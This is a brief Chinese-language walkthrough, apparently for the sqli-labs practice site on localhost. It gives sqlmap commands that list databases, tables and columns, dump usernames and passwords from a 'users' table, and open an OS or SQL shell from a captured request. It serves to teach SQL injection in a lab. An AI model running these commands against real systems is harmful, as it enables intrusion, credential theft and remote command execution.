## 爆所有库

这边需要手工找到注入点

```
python sqlmap.py -u "http://127.0.0.1/Sqli_Edited_Version-master/Less-1/?id=1" --dbs
```



## 爆表名

这边我们爆表名**security**

```
python sqlmap.py -u "http://127.0.0.1/Sqli_Edited_Version-master/Less-1/?id=1" -D security --tables
```



## 爆字段名

```
python sqlmap.py -u "http://127.0.0.1/Sqli_Edited_Version-master/Less-1/?id=1" -D security -T users --columns
```



## 爆字段内容

```
python sqlmap.py -u "http://127.0.0.1/Sqli_Edited_Version-master/Less-1/?id=1" -D security -T users -C id,username,password --dump


http://10.128.2.21/
```





## SQL-Shell

先传参bp抓包，抓到包后右键copy file保存文件

```
sqlmap -r file.txt --os-shell
sqlmap -r file.txt --sql-shell		//都可以
```

